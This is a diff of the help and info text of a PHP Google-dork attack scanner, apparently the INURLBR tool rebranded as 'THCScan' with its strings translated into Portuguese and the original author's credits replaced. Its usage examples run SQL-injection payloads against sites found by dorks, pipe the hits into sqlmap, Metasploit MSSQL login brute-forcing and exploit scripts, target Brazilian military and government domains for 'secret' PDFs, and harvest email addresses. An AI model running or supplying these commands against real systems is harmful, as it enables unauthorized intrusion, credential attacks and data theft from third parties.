+     Exemplo: {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                   
- {$_SESSION["c1"]}--sub-cmd-all{$_SESSION["c0"]} Run command to each target found within the sub-process scope.
-     Example: {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--sub-cmd-all{$_SESSION["c0"]} Execute o comando para cada destino encontrado no escopo do subprocesso.
+     Exemplo: {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
 
 
- {$_SESSION["c1"]}--port-scan{$_SESSION["c0"]} Defines ports that will be validated as open.
-     Example: {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}{ports}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}'22,21,23,3306'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--port-scan{$_SESSION["c0"]} Define portas que serão validadas como abertas.
+     Exemplo: {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}{ports}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}'22,21,23,3306'{$_SESSION["c0"]}
          
- {$_SESSION["c1"]}--port-cmd{$_SESSION["c0"]} Define command that runs when finding an open door.
-     Example: {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_:_PORT_'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--port-cmd{$_SESSION["c0"]} Defina o comando que é executado ao encontrar uma porta aberta.
+     Exemplo: {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_:_PORT_'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_/file.php?sqli=1'{$_SESSION["c0"]}
 
- {$_SESSION["c1"]}--port-write{$_SESSION["c0"]} Send values for door.
-     Example: {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}{'value0','value1','value3'}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--port-write{$_SESSION["c0"]} Envie valores para a porta.
+     Exemplo: {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}{'value0','value1','value3'}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #THCScan','PRIVMSG #THCScan : minha_msg'\"{$_SESSION["c0"]}
 
 
 
-    [!] Modifying values used within script parameters:
+    [!] Modificando valores usados nos parâmetros de script:
     
- {$_SESSION["c1"]}md5{$_SESSION["c0"]} Encrypt values in md5.
-     Example: {$_SESSION["c1"]}md5({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}md5({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=md5({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}md5{$_SESSION["c0"]} Criptografar valores em md5.
+     Exemplo: {$_SESSION["c1"]}md5({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}md5({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-get 'user?id=md5({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
 
- {$_SESSION["c1"]}base64{$_SESSION["c0"]} Encrypt values in base64.
-     Example: {$_SESSION["c1"]}base64({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}base64({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=base64({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}base64{$_SESSION["c0"]} Criptografar valores em base64.
+     Exemplo: {$_SESSION["c1"]}base64({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}base64({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-get 'user?id=base64({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
          
- {$_SESSION["c1"]}hex{$_SESSION["c0"]} Encrypt values in hex.
-     Example: {$_SESSION["c1"]}hex({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}hex({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=hex({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}hex{$_SESSION["c0"]} Criptografar valores em hexadecimal.
+     Exemplo: {$_SESSION["c1"]}hex({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}hex({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-get 'user?id=hex({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
 
- {$_SESSION["c1"]}hex{$_SESSION["c0"]} Generate random values.
-     Example: {$_SESSION["c1"]}random({$_SESSION["c2"]}{character_counter}{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}random({$_SESSION["c2"]}8{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=random({$_SESSION["c2"]}8{$_SESSION["c1"]})'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}hex{$_SESSION["c0"]} Gere valores aleatórios.
+     Exemplo: {$_SESSION["c1"]}random({$_SESSION["c2"]}{character_counter}{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}random({$_SESSION["c2"]}8{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-get 'user?id=random({$_SESSION["c2"]}8{$_SESSION["c1"]})'{$_SESSION["c0"]}
 
 ");
 }
@@ -985,30 +984,22 @@ function __info() {
  _| |_| |\  | |   | |__| |
 |_____|_| \_|_|    \____/
  
-{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Versao Atual do PHP =>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Desenvolvedor do Script =>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}OS Atual =>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Local Atual =>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
 {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
  
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GRUPO  INURL BRASIL - PESQUISA AVANÇADA.
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}SCRIPT NAME: INURLBR 2.1
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}AUTOR:    Cleiton Pinheiro
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Nick:     Googleinurl
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Email:    inurlbr@gmail.com  
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Blog:     http://blog.inurl.com.br
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Twitter:  https://twitter.com/googleinurl
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Facebook: https://fb.com/InurlBrasil
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GIT:      https://github.com/googleinurl
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Pastebin  https://pastebin.com/u/Googleinurl
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PSS:      https://packetstormsecurity.com/user/googleinurl
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}YOUTUBE:  http://youtube.com/c/INURLBrasil
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PLUS:     http://google.com/+INURLBrasil
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Version:  2.1
+ {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GRUPO  THC - 171 AVANÇADO.
+ {$_SESSION["c1"]}[*]{$_SESSION["c0"]}SCRIPT NAME: THCScan - Google Dork Scan 0.4.2.0-1
+ {$_SESSION["c1"]}[*]{$_SESSION["c0"]}AUTOR:    RavokTHC
+ {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Nick:     RavokTHC
+ {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GIT:      https://github.com/RavokTHC
+ {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Version:  0.4.2.0-1
 
 {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
  
-   {$_SESSION["c1"]}[+]{$_SESSION["c16"]}NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$_SESSION["c0"]}
+   {$_SESSION["c1"]}[+]{$_SESSION["c16"]}NECESSÁRIO PARA O FUNCIONAMENTO ADEQUADO DO SCRIPT{$_SESSION["c0"]}
 	
      {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} LIB & CONFIG{$_SESSION["c0"]}
 
@@ -1025,57 +1016,57 @@ function __info() {
                 
 {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
  
-   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}PERMISSION EXECUTION: chmod +x inurlbr.php{$_SESSION["c0"]}
-   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CURL: sudo apt-get install php5-curl{$_SESSION["c0"]}
-   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CLI: sudo apt-get install php5-cli{$_SESSION["c0"]}
+   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}EXECUÇÃO DE PERMISSÃO: chmod +x THCScan.php{$_SESSION["c0"]}
+   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALANDO LIB PHP-CURL: sudo apt-get install php5-curl{$_SESSION["c0"]}
+   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALANDO LIB PHP-CLI: sudo apt-get install php5-cli{$_SESSION["c0"]}
    {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl033[0m
-   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$_SESSION["c0"]}
+   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALANDO PROXY TOR https://www.torproject.org/docs/debian.html.en{$_SESSION["c0"]}
    
 {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
-     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} COMMANDS SIMPLE SCRIPT{$_SESSION["c0"]}
+     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} COMANDOS SCRIPT SIMPLES{$_SESSION["c0"]}
    
    
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]} 
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]} 
    
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]}
    
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
    
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
    
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
    
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
   
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\"{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\"{$_SESSION["c0"]}
    
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
   
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
    
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=THCScan MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
   
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
   
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
  
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
   
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
   
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
  
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]} 
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]} 
  
-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
  
-./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
  
-./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}sqli.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6  {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'   {$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}sqli.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6  {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#THCScan'   {$_SESSION["c0"]}
   
